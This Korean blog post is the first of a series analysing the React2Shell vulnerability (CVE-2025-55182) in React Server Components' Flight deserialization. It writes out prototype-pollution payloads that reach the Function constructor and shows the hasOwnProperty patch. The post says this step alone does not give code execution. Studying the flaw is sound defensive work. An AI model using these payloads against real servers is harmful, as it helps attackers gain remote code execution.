## 개요
2025년 12월에 발견된 `RSC`(React Server Components)의 `React2Shell` 취약점`CVE-2025-55182`은 `Flight 프로토콜` 페이로드를 서버 측에서 역직렬화 시 안전하지 않은 검증으로 인해 발생하는 RCE 취약점입니다.

즉, 클라이언트에서 서버로 보낸 Flight 프로토콜 페이로드에 대한 검증이 완전하지 않아 발생한 문제입니다.

이 공격에 대한 핵심 취약점을 크게 세 가지로 구분할 수 있으며, 전체 공격은 세 취약점의 연계로 완성됩니다.

<br>

1. **PRIMITIVE #1**: Prototype Pollution을 통한 Function 생성자 접근
2. **PRIMITIVE #2**: `initializeModelChunk()` 강제 호출
3. **Call Gadget**: Blob 처리를 통한 Function 실행

이 글에서는 먼저 **PRIMITIVE #1**까지 다루겠습니다

## Flight 프로토콜 역직렬화 과정

### 클라이언트가 서버로 보내는 데이터

```javascript
files = {
    "0": '["$1"]',                                              // Chunk 0: 배열, $1 참조
    "1": '{"object":"fruit","name":"$2:fruitName"}',           // Chunk 1: 객체, $2의 fruitName 참조
    "2": '{"fruitName":"cherry"}',                              // Chunk 2: 실제 데이터
}
```

### 서버에서 역직렬화 과정

**1단계: Chunk 0 파싱**

```javascript
// "$1" 발견 → Chunk 1로 이동
```

**2단계: Chunk 1 파싱**

```javascript
{
  object: "fruit",
  name: "$2:fruitName"  // Chunk 2의 fruitName 필드 참조
}
```

**3단계: Chunk 2에서 fruitName 가져오기**

```javascript
chunk2 = { fruitName: "cherry" }
value = chunk2["fruitName"]  // "cherry"
```

**최종 결과:**

```javascript
{ object: 'fruit', name: 'cherry' }
```

이처럼 Flight 프로토콜은 Chunk 간 참조를 통해 복잡한 데이터 구조를 전송할 수 있습니다.

## PRIMITIVE #1: Prototype Pollution을 통한 Function 접근

### 취약점: hasOwnProperty 검사 없음

**패치 전 코드:**

```javascript
// getOutlinedModel 함수 내부
const path = reference.split(':');  // "$2:fruitName" → ["2", "fruitName"]
let value = chunk;

for (let i = 1; i < path.length; i++) {
  value = value[path[i]];  // ❌ 검사 없이 그냥 접근
}
```

### 이게 왜 문제인가?

JavaScript 객체는 자신의 속성뿐 아니라 **프로토타입 체인의 속성**도 접근 가능합니다:

```javascript
const obj = { fruitName: "cherry" };

// 일반 접근
obj["fruitName"]        // "cherry" ✅
obj["toString"]         // [Function] (상속받은 메서드) ⚠️
obj["__proto__"]        // Object.prototype ⚠️
obj["constructor"]      // [Function: Object] ⚠️
```

> **핵심 문제**: `hasOwnProperty` 검사가 없어서 `__proto__`, `constructor` 같은 프로토타입 속성에 접근할 수 있습니다.
{: .prompt-danger }

## 공격 시나리오 #1: Function 생성자 접근

### 공격 페이로드

```javascript
files = {
    "0": '["$1:__proto__:constructor:constructor"]',
    "1": '{"x":1}'
}
```

### 역직렬화 과정 상세 분석

**Step 1: Chunk 0 파싱**

```javascript
// 배열 생성, "$1:__proto__:constructor:constructor" 참조 발견
```

**Step 2: 경로 분리**

```javascript
reference = "$1:__proto__:constructor:constructor"
path = reference.split(":")
// ["1", "__proto__", "constructor", "constructor"]
```

**Step 3: Chunk 1 가져오기**

```javascript
chunk1 = { x: 1 }
```

**Step 4: 경로 따라가기 (취약점 발생)**

```javascript
let value = chunk1;               // { x: 1 }

// 첫 번째 경로: "__proto__"
value = value["__proto__"];       // Object.prototype

// 두 번째 경로: "constructor"
value = value["constructor"];     // [Function: Object]

// 세 번째 경로: "constructor"
value = value["constructor"];     // [Function: Function] 💀
```

**최종 결과:**

```javascript
[Function: Function]  // Function 생성자 획득
```

### JavaScript 프로토타입 체인 이해

```
{ x: 1 }
   ↓ __proto__
Object.prototype
   ↓ constructor
[Function: Object]
   ↓ constructor
[Function: Function] 💀
```

모든 일반 객체 → `Object.prototype` → `Object` 생성자 → `Function` 생성자로 이어지는 체인을 따라갑니다.

---

## Function 생성자의 위험성

Function 생성자를 얻으면 **문자열로 된 코드를 실행**할 수 있습니다:

```javascript
const FunctionConstructor = Function;

// 예시 1: 간단한 코드 실행
FunctionConstructor('return 1 + 1')()  // 2

// 예시 2: process 객체 접근
FunctionConstructor('return process')()  // process 객체

// 예시 3: 파일 시스템 접근
FunctionConstructor('return require("fs")')()

// 예시 4: 원격 코드 실행 (RCE)
FunctionConstructor('return require("child_process").execSync("whoami")')()
```

> **주의**: Function 생성자는 `eval()`과 유사하게 임의의 JavaScript 코드를 실행할 수 있어 매우 위험합니다.
{: .prompt-danger }

## 공격 시나리오 #2: then을 Function으로 설정

### 배경 지식: Thenable 객체

JavaScript에서 객체에 `then` 메서드가 있으면 **Promise처럼 취급**됩니다:

```javascript
const obj = {
  then: function(resolve) {
    resolve("결과");
  }
};

// Promise로 인식됨
await obj;  // "결과"
```

이를 "Thenable" 객체라고 합니다.

### 공격 페이로드

```javascript
files = {
    "0": '{"then": "$1:__proto__:constructor:constructor"}',
    "1": '{"x":1}'
}
```

### 역직렬화 과정

**Step 1: Chunk 0 파싱**

```javascript
{
  then: "$1:__proto__:constructor:constructor"  // Function 생성자 참조
}
```

**Step 2: then 값 해석**

```javascript
// PRIMITIVE #1과 동일한 경로 탐색
chunk0.then = Function  // 💀
```

**Step 3: Next.js에서 이 객체를 await**

```javascript
// action-handler.ts (Next.js 내부)
boundActionArguments = await decodeReplyFromBusboy(
    busboy,
    serverModuleMap,
    { temporaryReferences }
)
```

**Step 4: await가 then 호출**

```javascript
// JavaScript await 내부 동작
if (typeof obj.then === 'function') {
  obj.then(resolve, reject);  // then이 함수면 호출
}

// 실제로는:
Function(resolve, reject);  // Function 생성자가 호출됨
```

### 발생하는 에러

```
SyntaxError: Unexpected token 'function'
    at Object.Function [as then] (<anonymous>) {
      digest: '1259793845'
    }
```

**왜 에러가 발생하나?**

```javascript
// V8 엔진의 내부 함수들
resolve  // function () { [native code] }
reject   // function () { [native code] }

// Function 생성자가 이렇게 해석 시도:
Function('resolve', 'function () { [native code] }')
// = function(resolve) { function () { [native code] } }  // ❌ 문법 오류
```

> 이 에러 자체는 공격 실패지만, **Function 생성자에 접근 가능함을 증명**합니다.
{: .prompt-info }

## PRIMITIVE #1 정리

### 취약점 요약

```
[핵심 취약점]
hasOwnProperty 검사 없이 obj[key] 접근

↓

[공격 경로]
$1:__proto__:constructor:constructor

↓

[획득 가능한 것]
Function 생성자

↓

[다음 단계]
Function을 실행하는 방법 필요
→ PRIMITIVE #2로 이어짐
```

### PRIMITIVE #1의 한계

- ✅ Function 생성자에 **접근 가능**
- ❌ Function을 **실행하지는 못함**
- ❌ 단독으로는 RCE 불가능

Function 생성자를 얻었지만, 이를 **실제로 실행**하려면 추가 기법이 필요합니다.

다음 글에서는 **PRIMITIVE #2**를 통해 `initializeModelChunk()`를 강제 호출하여 Function을 실행하는 방법을 알아봅니다.

## 패치 내용

### 취약점 수정

```javascript
// 패치 전
export function requireModule<T>(metadata: ClientReference<T>): T {
  const moduleExports = parcelRequire(metadata[ID]);
  return moduleExports[metadata[NAME]];  // ❌ 검사 없음
}

// 패치 후
export function requireModule<T>(metadata: ClientReference<T>): T {
  const moduleExports = parcelRequire(metadata[ID]);
  if (hasOwnProperty.call(moduleExports, metadata[NAME])) {  // ✅ 검사 추가
    return moduleExports[metadata[NAME]];
  }
  return (undefined: any);
}
```

### 패치 원리

`hasOwnProperty` 체크를 추가하여:
- 객체가 **직접 가진 속성**만 접근 허용
- `__proto__`, `constructor` 같은 프로토타입 체인 속성 차단

```javascript
const obj = { x: 1 };

obj.hasOwnProperty('x');           // true ✅
obj.hasOwnProperty('__proto__');   // false ❌
obj.hasOwnProperty('constructor'); // false ❌
```
